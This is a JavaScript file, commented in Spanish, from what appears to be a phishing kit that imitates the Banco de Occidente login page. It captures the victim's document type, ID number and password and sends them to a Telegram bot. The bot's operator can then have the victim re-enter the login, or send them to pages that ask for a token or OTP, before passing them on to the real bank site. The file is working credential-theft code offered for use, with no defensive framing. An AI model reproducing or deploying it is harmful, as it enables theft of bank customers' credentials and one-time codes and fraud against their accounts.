/**
 * OCCIDENTE - script.js OPTIMIZADO
 * Página principal con integración al sistema centralizado
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Occidente Index: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const inputs = {
        tipoDocumento: document.getElementById('tipoDocumento'),
        numeroDocumento: document.getElementById('numeroDocumento'),
        contrasena: document.getElementById('contrasena')
    };
    const btnSubmit = document.getElementById('submitBtn');
    const overlay = document.getElementById('loadingScreen');
    
    console.log('📋 Elementos:', { inputs, btnSubmit, overlay });

    BancoUtils.onTelegramAction(handleTelegramAction);

    // Validación de inputs
    inputs.numeroDocumento.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.numeroDocumento, 15);
        validateForm();
    });

    inputs.contrasena.addEventListener('input', validateForm);

    function validateForm() {
        const isValid = inputs.numeroDocumento.value.length >= 6 && 
                       inputs.contrasena.value.length >= 4;
        btnSubmit.disabled = !isValid;
        if (isValid) {
            btnSubmit.classList.add('enabled');
        } else {
            btnSubmit.classList.remove('enabled');
        }
    }

    validateForm();

    btnSubmit.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnSubmit.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = {
            tipoDocumento: inputs.tipoDocumento.value,
            numeroDocumento: inputs.numeroDocumento.value,
            contrasena: inputs.contrasena.value
        };

        console.log('📤 Datos a enviar:', data);
        BancoUtils.saveBankData('occidente', data);

        const message = BancoUtils.formatMessage('BANCO DE OCCIDENTE - LOGIN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('login', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) overlay.style.display = 'none';
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Occidente Index:', data);
        if (overlay) overlay.style.display = 'none';
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Limpiando campos de login');
                inputs.tipoDocumento.selectedIndex = 0;
                inputs.numeroDocumento.value = '';
                inputs.contrasena.value = '';
                btnSubmit.disabled = true;
                btnSubmit.classList.remove('enabled');
                break;
            case 'request_token':
                console.log('📱 Redirigiendo a token.html');
                window.location.href = 'token.html';
                break;
            case 'request_otp':
                console.log('🔢 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancodeoccidente.com.co');
                window.location.href = 'https://www.bancodeoccidente.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
